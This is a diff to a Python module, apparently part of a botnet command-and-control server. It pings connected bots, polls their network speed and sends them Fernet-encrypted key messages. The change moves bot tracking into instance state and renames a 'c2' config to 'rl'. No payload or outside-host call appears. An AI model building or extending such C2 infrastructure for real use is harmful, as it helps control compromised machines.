@@ -1,14 +1,14 @@
 from colorama import Fore
-from .config import c2_config_t as tconf
+from .config import rl_config_t as tconf
 import time
 import requests
 from cryptography.fernet import Fernet
 
-bots=[]
+
 
 class Loops():
 
-    def __init__(self, urlkey: str, api_url: str, fer: Fernet, gkey: list=[], speed: list=[], ogkey: list=[], passwd: str="", relaykey: str="", rbots: list=[], bots: list=[]):
+    def __init__(self, urlkey: str, api_url: str, fer: Fernet, gkey: list=[], speed: list=[], ogkey: list=[], passwd: str="", relaykey: str="", bots: dict={}):
         self.urlkey=urlkey
         self.api_url=api_url
         self.relaykey=relaykey
@@ -16,7 +16,6 @@ class Loops():
         self.gkey=gkey
         self.ogkey=ogkey
         self.passwd=passwd
-        self.rbots=rbots
         self.bots=bots
         self.fer=fer
 
@@ -50,7 +49,7 @@ class Loops():
     def ping(self):
         while 1:
             dead_bots = []
-            for bot in bots.keys():
+            for bot in self.bots.keys():
                 try:
                     bot.settimeout(3)
                     self.send(bot, 'PING', False, False)
@@ -60,7 +59,7 @@ class Loops():
                     dead_bots.append(bot)
                 
             for bot in dead_bots:
-                bots.pop(bot)
+                self.bots.pop(bot)
                 bot.close()
             time.sleep(tconf.ping_t)
 
@@ -72,7 +71,7 @@ class Loops():
                 for i in self.speed:
                     self.speed.remove(i)
             dead_bots = []
-            for bot in bots.keys():
+            for bot in self.bots.keys():
                 try:
                     bot.settimeout(3)
                     self.send(bot, f'NETSPEED', False, False)
@@ -88,7 +87,7 @@ class Loops():
                     dead_bots.append(bot)
                 
             for bot in dead_bots:
-                bots.pop(bot)
+                self.bots.pop(bot)
                 bot.close()
             time.sleep(tconf.net_t)
 
@@ -128,14 +127,14 @@ class Loops():
                     else:
                         print("apikey error")
             else:
-                ke.append(fer.encrypt(f'GKEY:[{ngkey}]'.encode()).decode())
+                ke.append(self.fer.encrypt(f'GKEY:[{ngkey}]'.encode()).decode())
                 for i in ke:
                     if self.api_key(i):
                         print("apikey op")
                     else:
                         print("apikey error")
             dead_bots=[]
-            for bot in bots.keys():
+            for bot in self.bots.keys():
                 try:
                     bot.settimeout(3)
                     if k!=[]:
@@ -150,5 +149,5 @@ class Loops():
                     dead_bots.append(bot)
                 
             for bot in dead_bots:
-                bots.pop(bot)
+                self.bots.pop(bot)
                 bot.close()
